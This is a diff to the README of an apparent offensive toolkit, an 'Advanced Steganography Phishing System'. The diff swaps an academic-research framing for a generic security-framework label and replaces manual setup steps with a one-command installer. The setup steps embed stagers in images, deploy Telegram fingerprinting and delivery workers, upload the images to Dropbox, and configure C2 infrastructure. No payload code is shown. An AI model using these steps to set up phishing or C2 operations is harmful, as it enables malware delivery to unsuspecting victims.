@@ -1,7 +1,7 @@
 # Advanced Steganography Phishing System
 
-🎯 **Academic Research Project** - PhD Criminology Research at Copenhagen University  
-🔬 **Purpose**: Advanced Persistent Threat Methodology Analysis & Defense Development
+🎯 **Complete Multi-Tool Security Framework**  
+🔬 **Purpose**: Advanced Persistent Threat Methodology & Defense Development
 
 ## 🏗️ Architecture Overview
 
@@ -17,28 +17,36 @@ This system demonstrates a sophisticated multi-layer phishing attack using stega
 
 ## 🚀 Quick Start
 
-### Prerequisites
+### One-Command Setup
 ```bash
-# Install dependencies
-sudo apt update && sudo apt install steghide
-pip3 install pillow numpy requests
+# Clone and setup complete system
+git clone https://github.com/EnkiJJK/advanced-steganography-phishing.git
+cd advanced-steganography-phishing
+./setup-complete-system.sh
 ```
 
-### Setup Process
+### Launch CLI Interface
 ```bash
-# 1. Create massive carrier images
-python3 large-stego-system.py create
+# Start the integrated CLI launcher
+./launch.sh --help
 
-# 2. Embed stagers into images  
-python3 large-stego-system.py process
+# System diagnostics
+./launch.sh doctor
 
-# 3. Deploy Cloudflare Workers
-wrangler deploy telegram-fingerprint-worker.js
-wrangler deploy telegram-delivery-worker.js
-wrangler deploy telegram-telemetry-worker.js
+# View available tools
+./launch.sh tools list
 
-# 4. Upload to Dropbox
-./stego-output/upload_large_images.sh
+# Generate steganography images
+./launch.sh stego batch
+
+# Configure C2 infrastructure
+./launch.sh c2 configure
+```
+
+### Alternative Python Interface
+```bash
+# Direct Python launcher
+python3 launcher.py --help
 ```
 
 ## 📁 System Structure
